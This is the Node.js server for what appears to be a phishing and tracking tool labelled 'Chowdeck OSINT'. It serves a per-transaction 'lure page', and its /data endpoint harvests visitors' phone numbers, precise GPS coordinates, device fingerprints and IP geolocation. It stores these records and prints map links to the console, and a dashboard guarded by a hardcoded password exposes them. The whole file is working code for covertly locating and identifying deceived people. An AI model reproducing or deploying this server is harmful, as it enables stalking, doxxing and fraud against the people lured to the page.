const express = require("express");
const fs      = require("fs");
const path    = require("path");
const crypto  = require("crypto");

const app      = express();
const PORT     = process.env.PORT || 3000;
const DATA_DIR = process.env.DATA_DIR || __dirname;
const LOG_FILE = path.join(DATA_DIR, "captures.json");

const ADMIN_USER = "chowadmin";
const ADMIN_PASS = "password123";
const sessions   = new Set();

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

function loadCaptures() {
  if (fs.existsSync(LOG_FILE)) {
    try { return JSON.parse(fs.readFileSync(LOG_FILE, "utf8")); }
    catch { return []; }
  }
  return [];
}

// Data collection endpoint
app.post("/data", (req, res) => {
  const data = req.body;
  const ip   = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const entry = {
    ip,
    ua:                  data.ua                  || null,
    timestamp:           data.timestamp           || new Date().toISOString(),
    source:              data.source              || "unknown",
    txn_id:              data.txn_id              || null,
    phone:               data.phone               || null,
    gps_lat:             data.gps_lat             || null,
    gps_lon:             data.gps_lon             || null,
    gps_accuracy_meters: data.gps_accuracy_meters || null,
    screen:              data.screen              || null,
    timezone:            data.timezone            || null,
    platform:            data.platform            || null,
    lang:                data.lang                || null,
    cores:               data.cores               || null,
    mem:                 data.mem                 || null,
    ip_city:             data.ip_city             || null,
    ip_region:           data.ip_region           || null,
    ip_country:          data.ip_country          || null,
    ip_isp:              data.ip_isp              || null,
    ip_lat:              data.ip_lat              || null,
    ip_lon:              data.ip_lon              || null,
    ip_addr:             data.ip_addr             || null,
  };

  const captures = loadCaptures();
  captures.push(entry);
  try { fs.writeFileSync(LOG_FILE, JSON.stringify(captures, null, 2)); } catch(e) {}

  if (entry.phone)   console.log(`\n[!] PHONE:  ${entry.phone}  | TXN: ${entry.txn_id} | ${entry.timestamp}`);
  if (entry.gps_lat) console.log(`[!] GPS:    ${entry.gps_lat}, ${entry.gps_lon} (±${entry.gps_accuracy_meters}m)\n    Maps: https://www.google.com/maps?q=${entry.gps_lat},${entry.gps_lon}`);
  if (entry.ip_city) console.log(`[!] IP GEO: ${entry.ip_city}, ${entry.ip_region}, ${entry.ip_country} | ${entry.ip_addr} | ${entry.ip_isp}`);
  if (entry.source === 'fingerprint') console.log(`[!] DEVICE: ${entry.platform} | ${entry.screen} | ${entry.timezone}`);

  res.sendStatus(200);
});

// Admin routes
app.get("/admin", (req, res) => res.sendFile(path.join(__dirname, "views", "admin-login.html")));
app.get("/admin/dashboard", (req, res) => res.sendFile(path.join(__dirname, "views", "admin-dashboard.html")));

app.post("/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = crypto.randomBytes(20).toString("hex");
    sessions.add(token);
    res.json({ ok: true, token });
  } else {
    setTimeout(() => res.status(401).json({ ok: false }), 1200);
  }
});

app.post("/admin/logout", (req, res) => {
  sessions.delete(req.headers["x-token"]);
  res.sendStatus(200);
});

app.get("/admin/captures", (req, res) => {
  const token = req.query.token || req.headers["x-token"];
  if (!sessions.has(token)) return res.status(401).json({ error: "Unauthorized" });
  res.json(loadCaptures());
});

// Serve lure page for /:txnId
app.get("/:txnId", (req, res) => {
  const txnId = req.params.txnId;
  if (!/^[A-Za-z0-9]{8,20}$/.test(txnId)) return res.status(404).send("Not found");
  let html = fs.readFileSync(path.join(__dirname, "public", "index.html"), "utf8");
  html = html.replace("__TXN_ID__", txnId.toUpperCase());
  res.send(html);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`\n[*] Chowdeck OSINT — port ${PORT}`);
  console.log(`[*] Generate link: node gen-link.js\n`);
});
